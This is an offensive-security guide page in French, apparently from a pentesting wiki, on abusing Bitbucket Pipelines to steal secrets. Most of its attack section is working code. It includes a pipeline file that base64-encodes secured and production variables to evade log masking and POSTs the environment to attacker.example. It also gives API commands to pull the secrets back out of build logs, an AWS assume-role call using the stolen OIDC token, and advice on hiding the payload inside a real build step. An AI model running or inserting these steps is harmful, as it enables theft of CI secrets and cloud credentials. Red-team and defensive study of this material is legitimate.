---
title: "Abus des pipelines"
order: 2
description: "Transformer un build Bitbucket Pipelines en exécution de code : déclencher bitbucket-pipelines.yml depuis une branche ou une pull request où vous pouvez pousser, exfiltrer les variables de dépôt et sécurisées en déjouant le masquage des logs, et atteindre les identifiants d'environnement de déploiement et les rôles cloud courtés par OIDC."
keywords:
  - Bitbucket Pipelines
  - variables sécurisées
  - injection de pipeline
  - variables de déploiement
  - OIDC
---

# Abus des pipelines

Bitbucket Pipelines exécute les étapes définies dans `bitbucket-pipelines.yml` à l'intérieur d'un conteneur Docker lors d'un push. Ces étapes s'exécutent avec les **variables** du dépôt injectées comme variables d'environnement, y compris celles marquées **secured**, plus toutes les variables d'**environnement de déploiement** lorsque l'étape cible un environnement, plus un jeton d'identité **OIDC** lorsque l'étape en demande un. Comme le YAML réside dans le dépôt et s'exécute sur une branche, **quiconque peut pousser une branche exécute sa propre étape avec ces identifiants**. C'est le cœur de l'abus : vous n'avez pas besoin de trouver une vulnérabilité, vous fournissez le script de build.

## Empreinte et prérequis

Il vous faut, au minimum, un accès en écriture sur une branche d'un dépôt où Pipelines est activé, ou la capacité d'ouvrir une pull request qui déclenche un pipeline `pull-requests`.

```bash
AUTH=(-u "$BB_USER:$BB_APP_PASSWORD")

# Is Pipelines enabled on the repo
curl -s "${AUTH[@]}" \
  https://api.bitbucket.org/2.0/repositories/ACME/payments-api/pipelines_config | jq '.enabled'

# Which variable NAMES exist at repo scope (values of secured ones are hidden)
curl -s "${AUTH[@]}" \
  https://api.bitbucket.org/2.0/repositories/ACME/payments-api/pipelines_config/variables/ | \
  jq -r '.values[] | "\(.key)\tsecured=\(.secured)"'

# Which deployment environments exist (each carries its own variables)
curl -s "${AUTH[@]}" \
  https://api.bitbucket.org/2.0/repositories/ACME/payments-api/environments/ | \
  jq -r '.values[] | "\(.name)\t\(.uuid)"'
```

`enabled=true` et une liste de noms de variables, c'est le feu vert. Une variable `secured=true` telle que `AWS_SECRET_ACCESS_KEY` ou `NPM_TOKEN` est la cible : l'interface masque sa valeur et l'API refuse de la renvoyer, mais une étape en cours d'exécution la lit en clair. Les environnements de déploiement nommés `Production` ou `staging` contiennent généralement les identifiants les plus puissants.

## Pourquoi les variables sécurisées restent exfiltrables

Une variable sécurisée est **masquée dans les logs de build**, pas retenue vis-à-vis de l'étape. Bitbucket analyse la sortie des logs et remplace les correspondances exactes de la valeur du secret par `****`. Le masquage est une correspondance littérale de sous-chaîne, de sorte que toute transformation de la valeur avant qu'elle n'atteigne le log le déjoue : base64, inversion, insertion de séparateurs, ou hachage puis fuite hors bande produisent tous une sortie qui ne correspond pas au secret stocké et qui est donc imprimée telle quelle.

## Étape d'exfiltration détaillée

Poussez ce `bitbucket-pipelines.yml` (ou ajoutez un pipeline propre à une branche) vers une branche que vous contrôlez. Le pipeline `custom:` ne s'exécute que lorsqu'il est déclenché manuellement ou lorsque vous placez la logique sous votre branche ; une entrée `branches:` limitée à votre branche s'exécute automatiquement lors d'un push.

```yaml
image: atlassian/default-image:4

pipelines:
  branches:
    'feature/ci-debug':          # a branch you can push; this runs automatically on push
      - step:
          name: collect
          deployment: production  # pulls the Production environment variables into this step
          oidc: true              # requests an OIDC identity token for cloud federation
          script:
            # Defeat log masking: base64 every secret so the literal value never appears
            - env | grep -iE 'TOKEN|SECRET|KEY|PASSWORD|AWS|NPM' | base64 -w0; echo
            # Exfiltrate out of band so it survives even if the log is reviewed
            - curl -s -X POST https://attacker.example/c -d "$(env | base64 -w0)"
            # The OIDC assertion, used to assume a cloud role below
            - echo "$BITBUCKET_STEP_OIDC_TOKEN" | base64 -w0; echo
```

```bash
# Trigger by pushing the branch
git checkout -b feature/ci-debug
git add bitbucket-pipelines.yml && git commit -m "ci" && git push origin feature/ci-debug

# Read the result from the build log via the API
PIPE=$(curl -s "${AUTH[@]}" \
  "https://api.bitbucket.org/2.0/repositories/ACME/payments-api/pipelines/?sort=-created_on&pagelen=1" \
  | jq -r '.values[0].uuid')
curl -s "${AUTH[@]}" \
  "https://api.bitbucket.org/2.0/repositories/ACME/payments-api/pipelines/$PIPE/steps/" \
  | jq -r '.values[].uuid'
# then fetch the step log; the base64 blob decodes to the cleartext secrets
curl -s "${AUTH[@]}" \
  "https://api.bitbucket.org/2.0/repositories/ACME/payments-api/pipelines/$PIPE/steps/$STEP/log" \
  | grep -Ao '[A-Za-z0-9+/=]{40,}' | base64 -d
```

Interprétez le log : le blob `base64 -w0` représente vos secrets avec le masquage déjoué ; repassez-le localement dans `base64 -d`. Si `deployment: production` a été accepté, les variables de l'environnement figurent dans ce même dump. Si `oidc: true` a produit un `$BITBUCKET_STEP_OIDC_TOKEN`, vous détenez désormais un JWT signé de courte durée pour la fédération cloud.

## Variantes

- **Pipelines par défaut et de pull request** : si vous ne pouvez pas ajouter une entrée `branches:` mais qu'un pipeline `default:` ou `pull-requests:` existe, ouvrez une PR depuis une branche que vous avez poussée ; le pipeline de la PR s'exécute avec les variables du dépôt. Vérifiez si les variables sécurisées et de déploiement sont exposées aux builds de PR dans cet espace de travail, car c'est le seul endroit où un espace de travail peut les restreindre.
- **Empoisonner une étape existante** : au lieu d'une nouvelle étape, ajoutez vos lignes de `script` à la véritable étape de build du dépôt, de sorte que le pipeline paraisse normal et déploie malgré tout, réduisant la probabilité que quelqu'un consulte le log.
- **Pipeline personnalisé avec entrées** : un pipeline `custom:` peut être déclenché via l'API (`POST /pipelines/` avec un sélecteur `target`) sans pousser une branche visible, utile lorsque la création de branches est restreinte mais pas la permission de déclenchement de pipeline.
- **Empoisonnement du cache et des artefacts** : une étape peut écrire dans les `caches:` partagés ou publier des `artifacts:` qu'un pipeline privilégié ultérieur consomme, déplaçant votre charge utile dans un build que vous ne pouviez pas déclencher directement.

## Suite

- **Identifiants de déploiement** : les variables d'environnement `production`/`staging` sont généralement des clés de déploiement cloud, des jetons de registre ou des clés SSH ; chacune est un pivot vers la cible qu'elle déploie.
- **OIDC vers le cloud** : échangez `$BITBUCKET_STEP_OIDC_TOKEN` contre des identifiants cloud. Pour AWS, le fournisseur d'identité du pipeline est l'émetteur OIDC de l'espace de travail et le `sub` du jeton encode le dépôt et l'étape ; assumez le rôle de confiance :

```bash
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::123456789012:role/bitbucket-deploy \
  --role-session-name p --web-identity-token "$BITBUCKET_STEP_OIDC_TOKEN" \
  | jq '.Credentials'
```

  Les clés renvoyées vous font entrer dans le chemin [AWS](../../cloud/aws/index.md) avec les permissions du rôle de déploiement.
- **Pillage de jetons** : tout jeton d'accès Bitbucket présent comme variable renvoie à [Abus des jetons et mots de passe d'application](token-and-app-password-abuse.md).

## Notes

- Le masquage est uniquement par correspondance exacte ; même `echo "${SECRET:0:20}"; echo "${SECRET:20}"` imprime les deux moitiés sans masquage, car aucune des deux moitiés n'est égale à la valeur stockée.
- Le jeton OIDC est propre à l'étape et de courte durée ; capturez-le et utilisez-le dans la même fenêtre de build, ou exfiltrez-le et assumez le rôle immédiatement.
- Une étape reçoit les variables d'un environnement de déploiement uniquement lorsqu'elle déclare `deployment: <env>` et que l'environnement n'a aucune restriction de déploiement que vous ne satisfaites pas. Un environnement non restreint remet ses variables à toute branche qui le déclare, ce qui est la mauvaise configuration courante à rechercher ; un environnement avec des restrictions de branche, d'administration ou personnalisées met en pause ou bloque le déploiement et l'étape n'obtient aucune variable, alors confirmez que l'environnement est non restreint (ou que votre branche satisfait la restriction) avant de compter là-dessus.
- Bitbucket Data Center/Server n'a pas de Pipelines ; l'abus CI équivalent y vise le Bamboo connecté ou un runner externe, pas ce fichier.

## Outils

- **git** : pousser la branche ou la PR qui déclenche le pipeline.
- **curl** / **jq** : déclencher des pipelines personnalisés et lire les logs d'étape via l'API 2.0.
- **base64** / **xxd** : transformer les valeurs sécurisées pour déjouer le masquage par correspondance exacte des logs.
- **aws-cli** (`assume-role-with-web-identity`) : échanger le jeton OIDC contre des identifiants cloud.

## Références

- [Bitbucket Pipelines : variables and secrets](https://support.atlassian.com/bitbucket-cloud/docs/variables-and-secrets/)
- [Bitbucket Pipelines : using OpenID Connect](https://support.atlassian.com/bitbucket-cloud/docs/integrate-pipelines-with-resource-servers-using-oidc/)
- [Bitbucket Pipelines : deployments and environments](https://support.atlassian.com/bitbucket-cloud/docs/set-up-and-monitor-bitbucket-deployments/)
- [HackTricks Cloud : Bitbucket security](https://cloud.hacktricks.wiki/en/pentesting-ci-cd/bitbucket-security/index.html)
- [Bitbucket Pipelines REST API](https://developer.atlassian.com/cloud/bitbucket/rest/api-group-pipelines/)
